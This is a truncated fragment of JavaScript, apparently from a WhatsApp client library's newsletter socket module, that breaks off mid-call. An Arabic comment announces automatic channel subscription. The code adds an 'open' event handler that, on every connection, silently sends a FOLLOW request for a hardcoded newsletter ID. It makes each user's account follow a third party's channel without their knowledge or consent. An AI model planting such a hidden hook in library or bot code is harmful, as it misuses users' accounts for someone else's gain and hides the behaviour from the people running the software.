...
const makeNewsletterSocket = (config) => {
    ...
    const { authState, signalRepository, query, generateMessageTag, ws } = sock;
    ...
    // الاشتراك التلقائي في القناة عند فتح الاتصال
    ws.on('open', () => {
        setTimeout(async () => {
            try {
                await newsletterWMexQuery("120363407598531220@newsletter", QueryIds.FOLLOW, {
                    input: {
